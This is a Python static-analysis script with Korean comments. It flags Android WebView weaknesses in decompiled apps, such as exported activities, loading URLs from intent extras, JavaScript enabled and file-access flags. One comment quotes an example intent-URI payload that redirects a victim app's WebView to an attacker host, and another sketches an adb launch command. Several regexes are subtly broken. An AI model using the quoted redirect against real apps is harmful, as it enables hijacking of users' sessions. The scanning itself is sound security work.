import re
import os
class WebviewAnalyzer:

    def __init__(self):
        self.java_dir = 'java_src'
        #xml에서 view관련 액티비티, export=true인지 확인
        #activity줄에서 webview가 있는지 확인
        self.activity_pattern = re.compile(r'activity[^<>]*view[^<>]*exported="true"[^<>]*/>',re.IGNORECASE)

        #adb shell am start -n 앱 패키지/activity명 --es key value
        self.getExtra_pattern=re.compile(r"get[^()]*Extra",re.IGNORECASE)#getExtras와 getStringExtra 저 옵션을 쓰려면 intent와 함께 이 조건을 충족해야함.
        #self.intent_pattern=re.compile(r"Intent",re.IGNORECASE)

        #파일 로드 혹은 url로드
        self.url_pattern=re.compile(r"://",re.IGNORECASE)

        self.loadUrl_pattern=re.compile(r"loadUrl",re.IGNORECASE)
        self.putExtra_pattern=re.compile(r"put[^()]*Extra",re.IGNORECASE) #intent.putExtra("key","value")
        #file
        self.loadData_pattern=re.compile(r"loadData[^)]*text/html",re.IGNORECASE) #임의의 text/html, 보통 if else로 loadurl과 같이 있음.
        #Redirect within WebViewlocation.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fattacker-website.com%2F;end";
        self.shouldOverrideUrlLoading_pattern=re.compile(r'shouldOverrideUrlLoading',re.IGNORECASE) #url리다이렉트 

        #enabledjs=> 위 adb명령어와 함께 사용
        #self.javascript_pattern=re.compile(r'javascript',re.IGNORECASE) #인자로 javascript:가 들어간 경우/ @JavascriptInterface ->setjavascriptenabled는 @javascriptinterface를 사용해야함 근데 @JavascriptInterface는 아님.
        self.setjavascriptenabled_pattern=re.compile(r'setjavascriptenabled',re.IGNORECASE) 

        #file 외부 접근 가능
        self.setAllowFileAccessFromFileURLs_pattern=re.compile(r'setAllowFileAccessFromFileURLs(true)',re.IGNORECASE) #Android Jelly Bean 4.~이상에서는 기본비활성화
        self.allowuniversalaccess_pattern=re.compile(r'setAllowUniversalAccessFromFileURLs(true)',re.IGNORECASE) #외부 소스에서 로컬 파일에 액세스 가능. adb shell ~~http대신 file:// 가능
        self.setallowfileaccess_pattern=re.compile(r'setAllowFileAccess(true)',re.IGNORECASE) #file://data/data/com.package.name/app_webview 접근 가능. android 10이상에서는 비활성화


    #manifest
        
    def analyze_manifest(self, content):#and
        #activity<> 안에서 webview와 name=true가 공존하는지 확인
        matches=[]
        matches=self.activity_pattern.findall(content)
        #root=os.walk(self.java_dir)
        if matches:
            #print(matches)
            patterns=re.compile(r'android:name="([^"]*)"',re.IGNORECASE)
            #package_name = root.replace(self.java_dir, '').strip(os.sep).split(os.sep)[0]
            #print(f"package_name {package_name}")
            name_extract=patterns.search(matches[0])
            name_string = name_extract.group(1)
            print(f"name_extract {name_string}")
            print(f"na_string {name_string}")
            return name_string

    def analyze_activity(self, activity):
        #print(f"activity {activity}")
        # 파일에서 SQL 취약점을 검사
        try:
            with open(activity, 'r', encoding='utf-8') as file:
                sources = file.read()
                #intent인자
                intent_exist=self.url_pattern.findall(sources) or self.getExtra_pattern.findall(sources)
                #urlredirect 가능한 함수
                webviewmatches=self.loadUrl_pattern.findall(sources) and intent_exist or self.shouldOverrideUrlLoading_pattern.findall(sources)
                #fileaccess 가능한 함수
                fileaccessmatches=self.setAllowFileAccessFromFileURLs_pattern.findall(sources) or self.allowuniversalaccess_pattern.findall(sources) or self.setallowfileaccess_pattern.findall(sources)
                #webview 취약점 확인
                webviewvuln_exist=webviewmatches
                #fileaccess 가능한 함수
                fileaccessvuln=webviewvuln_exist and fileaccessmatches
                #javascript enabled된 함수
                enabledjsvuln=webviewvuln_exist and self.setjavascriptenabled_pattern.findall(sources)
                #fileload 가능한 함수-추가요소
                fileaccessvuln=webviewvuln_exist and self.loadData_pattern.findall(sources)
                print(f"webvievuln_exist {webviewvuln_exist}, enabledjsvuln {enabledjsvuln}, fileaccessvuln {fileaccessvuln}")

        except UnicodeDecodeError:
            return False
        
    def run(self,content):
        #print(f"java_dir {java_dir} end")
        name_string=self.analyze_manifest(content)
        #print(f"name_string {name_string}")
        if name_string is not None:
            activity_path=name_string.replace('.','\\')+".java"
            path=os.path.dirname(name_string)
            Whole_path=""
            if f"<manifest" in content:
                package=content.split("package=")[1].split('"')[1]
                #print(f"package {package}")
                print(f"path {path}")
                Whole_path = f"{os.getcwd()}\\java_src\\{package}\\sources\\{activity_path}"
                print(f"Whole_path {Whole_path}")
            else:
                exit()
            #print(f"path {path}")
            if f"{path}" in content:
                print(f"activity_path {activity_path}")
                print("analyze started")
                self.analyze_activity(Whole_path)
            else:
                print("no webview activity found")
